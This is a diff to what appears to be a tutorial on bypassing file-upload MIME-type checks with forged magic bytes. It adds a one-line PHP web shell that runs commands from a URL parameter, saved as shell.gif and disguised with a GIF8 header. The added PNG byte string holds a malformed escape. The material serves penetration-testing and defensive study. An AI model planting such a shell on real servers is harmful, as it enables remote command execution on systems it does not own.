@@ -272,12 +272,13 @@ MIME-Type validation checks the file’s **actual content** using its signature 
 
 Examples:
 - GIF files begin with: `GIF87a` or `GIF89a` `GIF8`
-- PNG files begin with: `\x89PNG\r\n\x1a\n`
+- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
+- **JPG**: `"\xff\xd8\xff"`
 
 Changing these first bytes alters the detected MIME type.
 ```bash
 echo "GIF8" > text.jpg
-file text.jpg
+file text.jpg # gif 
 ```
 The file now appears as a GIF image, despite being arbitrary content.
 
@@ -292,6 +293,10 @@ if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))
 ```
 
 To bypass:
+
+```bash
+ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+```
 - Prepend `GIF8` to your PHP shell.
 - Keep the extension `.php` so the server still executes PHP.
 - MIME-type becomes `image/gif`, allowing the file to pass validation.
